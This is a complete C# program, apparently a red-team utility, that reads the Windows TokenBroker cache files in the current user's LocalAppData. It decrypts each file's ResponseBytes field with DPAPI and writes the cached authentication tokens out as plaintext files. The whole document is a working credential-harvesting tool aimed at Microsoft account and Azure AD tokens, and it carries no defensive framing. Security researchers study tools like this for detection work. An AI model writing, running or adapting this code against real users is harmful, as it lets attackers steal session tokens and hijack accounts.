using System;
using System.IO;
using System.Text;
using System.Security.Cryptography;
using System.Text.Json;
using System.Text.Json.Nodes;
using System.Buffers.Text;
using System.Runtime.InteropServices;

namespace TBRES
{
    public class main
    {
        public static string[] GetFiles(string dir)
        {
            var tbresFiles = Directory.EnumerateFiles(dir, "*.tbres");
            return tbresFiles.ToArray();
        }

        public static void OutputDecryptedData(string origFile, string input)
        {
            try
            {
                var jsonObject = JsonNode.Parse(input).AsObject();
                var encodedData = jsonObject["TBDataStoreObject"]["ObjectData"]["SystemDefinedProperties"]["ResponseBytes"]["Value"].ToString();
                var encryptedData = Convert.FromBase64String(encodedData);
                var decryptedData = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
                File.WriteAllBytes(Path.GetFileName(origFile) + ".decrypted", decryptedData);

            } catch (System.Exception) {
                Console.WriteLine("[!] Error Decrypting File: {0}", origFile);
                return;
            }

            Console.WriteLine("[*] TBRES Decrypted: {0}.decrypted", Path.GetFileName(origFile));

        }

        public static string DecryptFiles(string dir)
        {
            foreach (var file in GetFiles(dir))
            {
                var fileJSON = File.ReadAllText(file, Encoding.Unicode);
                fileJSON = fileJSON.Substring(0, fileJSON.Length - 1);
                OutputDecryptedData(file, fileJSON);
            }

            return "";
        }

        public static void Main(string[] args)
        {
            Console.WriteLine("TBRES Decryptor by @_xpn_");

            var path = String.Format(@"{0}\Microsoft\TokenBroker\Cache", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
            main.DecryptFiles(path);
        }
    }
}
